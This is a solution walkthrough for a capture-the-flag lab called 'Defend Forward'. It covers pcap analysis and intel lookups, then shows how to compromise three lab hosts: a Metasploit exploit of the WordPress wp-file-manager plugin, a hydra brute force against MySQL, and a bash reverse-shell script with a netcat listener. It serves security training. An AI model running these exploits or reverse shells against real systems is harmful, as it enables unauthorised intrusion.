# Defend Forward

*Solution Guide*

## Overview

*Defend Forward* requires the competitor to use intel and network traffic to discover who is attacking them, determine what systems are important to the three adversaries, and then gain remote access to those systems.

>**Reminder!** Reading this solution guide *before* attempting the challenge will lead to the false notion that this challenge is easy to solve.

## Part 1: Determine the Attacker IPs

1. On the Kali machine: browse to `challenge.us`, review the three questions, and click **here** to download the files.
2. When available, download **readme.txt** (and read it!), **apts.tar.gz**, and **apts-and-ips.tar.gz.ctr**.
3. Open a terminal and change directory into `/home/user/Downloads`.

```bash
cd /home/user/Downloads
```

4. Extract and review the **apts.tar.gz** file.

```bash
tar xf apts.tar.gz
open <filename>
```

5. Review the data on each of the 14 countries. Notice each country has seven APT groups. We need to find out which countries and APT groups are attacking so we can strike their Achilles Heel in their critical IP range. Since we don't have console access to the SFTP, database, or webserver, we'll start by reviewing network traffic.
6. Let’s extract a pcap from Security Onion. Browse to `10.4.4.4` and log in. It may take up to eight (8) minutes from the launch of the challenge for all of Security Onion’s services to run.
7. Click **PCAP**, the **+** (plus) to add a job.
8. For **SensorID**, enter `securityonion`; for the **Filter Begin** and **Filter End**, enter dates that cover your time in the challenge. To be safe, you can put yesterday’s date (e.g., 2024-01-05) and tomorrow’s date (e.g., 2024-01-07) in **Filter Begin** and **Filter End**, respectively. Click **ADD**. 
9. Click the **binoculars**, then the download icon, to download the pcap file.
10. In Wireshark, open the pcap. Remember, we are tasked with finding the primary attackers against the database, webserver, and SFTP server. 
11. Let’s look at some statistics in Wireshark. Click **Statistics**, **Conversations**. Select the **TCP** tab. By default, Address A is ordered lowest to highest numerically. This works to our advantage.
12. Scrolling down, we see:
	- `10.1.1.11` listening on TCP port 5001 (database) and a repeating IP address as the attacker (e.g., `242.70.194.133`).
	- `10.1.1.15` listening on TCP port 22 (SFTP) and a repeating IP address as the attacker (e.g., `246.177.155.58`).
	- `10.1.1.20` listening on TCP port 80 (webserver) and a repeating IP address as the attacker (e.g., `250.101.87.75`).

13. Enter these three values into `challenge.us` in their appropriate blocks and **Submit**. Your values will differ.

## Part 2: Determine Adversaries and their Achilles Heel

Once the three values are submitted, each part of the 30-character password should be returned.

1. Run the command listed in the **readme.txt** file to decrypt **apts-and-ips.tar.gz.ctr** file. Enter the 30-character password.

```bash
cd /home/user/Downloads
openssl enc -aes-256-ctr -d -salt -pbkdf2 -in apts-and-ips.tar.gz.ctr -out apts-and-ips.tar.gz
```

2. Extract the tarball.

```bash
tar xf apts-and-ips.tar.gz
```

3. We have a lot of docx and pdf files here. The docx and pdf files are the same, just different formats. We can convert each pdf to a text file with `pdftotext`. To install `pdftotext`, run the command below.

```bash
sudo apt install poppler-utils
```

4. Create a "one-liner" to convert all pdfs to txt files. 

>Note: Make sure **all** pdfs are converted to txt files. This include the pdfs extracted from the `apts.tar.gz` file downloaded from `http://challenge.us/files` and, the pdfs obtained after decrypting the **apts-and-ips.tar.gz.ctr** file.

```bash
for i in *.pdf; do pdftotext $i; done
```

5. Now that all files are in txt format, let’s see if we find which APTs are responsible for these attackers. In this example, `242.70.194.133`, `246.177.155.58`, and `250.101.87.75` are the three attackers. We will run the grep commands below. With these commands, we see `242.70.194.0/24` is associated with the APT group **SAFFRONSKUNK**, `246.177.155.0/24` is associated with the APT group **CYANCHAMELEON**, and `250.101.87.0/24` is associated with the APT group **NEONNEXUSES**. Your APT groups may differ.

```bash
grep 242.70 *.txt
grep 246.177 *.txt
grep 250.101 *.txt
```

6. Let’s see which countries are associated with these three APT groups using the grep commands below. With these commands, we see SAFFRONSKUNK is part of the country **Echolux**, CYANCHAMELEON is part of the country **Elysianta**, and NEONNEXUSES is part of the country **Terravale**. Again, your groups and countries may differ.

```bash
grep -i SAFFRONSKUNK *.txt
grep -i CYANCHAMELEON *.txt
grep -i NEONNEXUSES *.txt
```

7. We now know the APT and country of each of the three attackers--let’s find the Achilles Heel and critical IP range of each APT/country pair.

```bash
cat ips-Echolux.txt
cat SAFFRONSKUNK.txt 
```

8. Running the commands above show results like the results below (since SAFFRONSKUNK is the APT group and associated with the country Echolux). In this example, there appears to be a Hacker Group/Government Website in the country’s IP range `252.119.111.0/24` (Suspected Critical IP Block, **not** Attacker IPs).

```
Echolux
Population: 279813889
Suspected Critical IP Block: 252.119.111.0/24
Suspected APT Groups:
SAFFRONSKUNK
MAGENTAPANDA
VIPERVANGUARD
PLUMPUFFIN
INDIGOIGUANA
PURPLEELEPHANT
AURORAASSASSINS
```

-and-

```
SAFFRONSKUNK
APT Name: SAFFRONSKUNK
Date First Seen: 20Nov2020
Suspected Goals: Promote Country Beliefs on Others, Acquire Military Technology
Suspected Attacker IPs: 242.70.194.0/24
Suspected Achilles Heel: Hacker Group/Government Website
```

9. Do the same for the other two APT/country pairs. Yours may be different.

```bash
cat ips-Elysianta.txt
cat CYANCHAMELEON.txt
```

-and-

```bash
cat ips-Terravale.txt
cat NEONNEXUSES.txt
```

10. Review all of these results. There is a Hacker Group Website in its country’s IP range `251.139.90.0/24`, Bot/C2 Machine in its country’s IP range `247.187.158.0/24`, and Database in its country’s IP range  `252.119.111.0/24`. We must get a remote shell to each of these machines.

## Part 3: Discover the Tokens

### Token 1: Hacker Group/Government Website

1. Perform a basic scan in the Hacker Group/Government Website country's Suspected Critical IP Block.

```bash
sudo nmap -T4 251.139.90.0/24 -oN scan1.txt
```

2. We see TCP port 80 is open on one machine (e.g., `251.139.90.138`). Browse to this machine.
4. Here we see a WordPress site (indicated by a small, hidden hyperlink in the bottom-right of the home page, the favicon, etc.).
5. The challenge instructions tell us vulnerable software might be in use. Use Metasploit to scan this WordPress site. Run the following commands: 

```bash
sudo msfconsole
use auxiliary/scanner/http/wordpress_scanner
set rhosts 251.139.90.138
run
```

6. Here we see a plug-in (**wp-file-manager version 6.0**) appears to be installed. Let’s search to see if there are any modules to attack this plug-in.

```bash
search wp-file-manager
use 0
show options
set rhosts 251.139.90.138
set lhost 10.5.5.64 (the IP of your Kali)
run
```

7. We now have a Meterpreter session! Let’s open a shell.

```bash
shell
```

9. Search for the token.

```bash
find / -name token*
```

10. We see `token1.txt` is located at `/usr/local/etc/php/conf.d/token1.txt`. Run the command below to find Token 1!

```bash
cat /usr/local/etc/php/conf.d/token1.txt
```

### Token 2: Database

1. Perform a basic scan in the the Database country's Suspected Critical IP Block.

```bash
sudo nmap -T4 252.119.111.0/24 -oN scan2.txt
```

2. If you have the correct IP range, you will find one machine (e.g., `252.119.111.154`) in this subnet with the TCP port 1114. Let’s discover what service is on this port.

```bash
sudo nmap -sV -p 1114 252.119.111.154 -oN scan3.txt
```

3. We see MySQL. Recall, the challenge instructions say weak usernames and weak passwords might be in use. Using tools like **xhydra**, **hydra** allow competitors to discover the username is *user* and the password is *password* (very weak credentials indeed!). Here is an example of how to use hydra to brute force these credentials using **hydra** and the wordlist provided in game: 

```bash
hydra -L /media/cdrom0/wordlist.txt -P /media/cdrom0/wordlist.txt 252.119.111.154 mysql -s 1114
```

Once credentials are found, run the command below and enter obtained password.

```bash
mysql -u user -p --host=252.119.111.154 --port=1114
```

4. We now have remote access to the APT group’s MySQL database. Run the commands below to search for Token 2.

```
SHOW databases;
USE tokens;
SHOW tables;
SELECT * FROM tokens;
```

5. Here we see Token 2!

### Token 3: Bot/C2 Machine

1. Perform a basic scan in the Bot/C2 country's Suspected Critical IP Block.

```bash
sudo nmap -T4 247.187.158.0/24 -oN scan4.txt
```

2. Nothing appears. Run the command below to see if any TCP ports are open.

```bash
sudo nmap -T4  -p- 247.187.158.0/24 -oN scan5.txt
```

3. Again, nothing appears. Extract another pcap file (follow the procedure documented above) and look for any IP addresses in the `247.187.158.0/24` range. It appears a machine is looping through, scanning `10.5.5.50-70` (e.g., `247.187.158.57`). It is looking on TCP/80; however, no machines are accepting connections. Let’s see what happens if we allow the three-way handshake to occur.
4. On a Kali machine that has an IP address within `10.5.5.50-70`, start **apache2**.

```bash
sudo systemctl start apache2
```

5. After a couple of minutes, export another pcap file and see what happened. You can run the command below instead to look at network traffic.

```bash
sudo tcpdump -i eth0 port 80
```

6. Within this network traffic, we see the machine (`247.187.158.57`) is looking for a `bdoor.sh`; however, it is not present.

7. Let’s create a simple reverse shell bash script. Enter the following into `/var/www/html/bdoor.sh`. Ensure you replace the IP address (`10.5.5.64`) with your Kali VM’s IP address.

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.5.5.64/4444 0>&1
```

8. On Kali, create a netcat listener to receive the reverse shell.

```bash
nc -nlvp 4444
```

9. The Bot/C12 machine should download `bdoor.sh`, `execute bdoor.sh``, and establish a reverse shell within a few minutes.
10. Once you have the reverse shell in your netcat listener, you will find `token3.txt` at `/home/user/.token3.txt` (notice the file is hidden due to the leading period). View the token.

```bash
cat /home/user/.token3.txt
```
Here we see Token 3!